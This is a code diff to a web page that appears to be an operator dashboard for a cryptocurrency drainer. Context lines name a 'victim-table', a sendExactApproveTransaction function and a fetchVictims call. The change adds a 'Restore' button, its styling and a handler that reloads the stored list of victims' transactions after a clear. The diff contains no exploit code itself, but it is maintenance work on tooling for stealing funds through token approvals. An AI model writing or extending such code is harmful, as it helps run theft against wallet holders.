@@ -99,8 +99,11 @@
     .more-container { padding: 24px 40px; }
     .more-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; gap: 12px; }
     .more-header h3 { margin: 0; font-size: 18px; font-weight: 600; }
+    .more-actions { display: flex; gap: 8px; align-items: center; }
     .clear-btn { padding: 6px 14px; font-size: 13px; font-weight: 500; border-radius: 6px; background: transparent; color: var(--punch); border: 1px solid var(--punch); cursor: pointer; transition: background 0.15s ease, color 0.15s ease; }
     .clear-btn:hover { background: var(--punch); color: white; }
+    .restore-btn { padding: 6px 14px; font-size: 13px; font-weight: 500; border-radius: 6px; background: transparent; color: var(--azure-40); border: 1px solid var(--azure-40); cursor: pointer; transition: background 0.15s ease, color 0.15s ease; }
+    .restore-btn:hover { background: var(--azure-40); color: white; }
     #victim-table { width: 100%; border-collapse: collapse; font-size: 13px; }
     #victim-table th, #victim-table td { padding: 8px 12px; text-align: left; border-bottom: 1px solid var(--grey-93); white-space: nowrap; }
     #victim-table th { font-weight: 600; color: var(--azure-15); background: var(--grey-98); }
@@ -205,7 +208,7 @@
       .more-panel[hidden] { display: none !important; }
       .more-container { padding: 16px 12px; }
       .more-header h3 { font-size: 15px; }
-      .clear-btn { padding: 5px 10px; font-size: 12px; }
+      .clear-btn, .restore-btn { padding: 5px 10px; font-size: 12px; }
       #victim-table-wrapper { overflow-x: auto; -webkit-overflow-scrolling: touch; border: 1px solid var(--grey-93); border-radius: 8px; }
       #victim-table { font-size: 12px; display: table; min-width: 620px; white-space: nowrap; }
       #victim-table th, #victim-table td { padding: 8px 10px; }
@@ -324,7 +327,10 @@
       <div class="more-container">
         <div class="more-header">
           <h3>Transactions</h3>
-          <button type="button" class="clear-btn" id="clear-victims-btn">Clear</button>
+          <div class="more-actions">
+            <button type="button" class="restore-btn" id="restore-victims-btn">Restore</button>
+            <button type="button" class="clear-btn" id="clear-victims-btn">Clear</button>
+          </div>
         </div>
         <div id="victim-table-wrapper">
           <p id="victim-loading">Chargement...</p>
@@ -1127,6 +1133,15 @@ async function sendExactApproveTransaction() {
       populateTable(window.__lastVictims);
     } else {
       populateTable([]);
+    }
+  });
+
+  document.getElementById('restore-victims-btn').addEventListener('click', function() {
+    localStorage.removeItem(CLEAR_KEY);
+    if (typeof window.__lastVictims !== 'undefined') {
+      populateTable(window.__lastVictims);
+    } else {
+      fetchVictims();
     }
   });
 
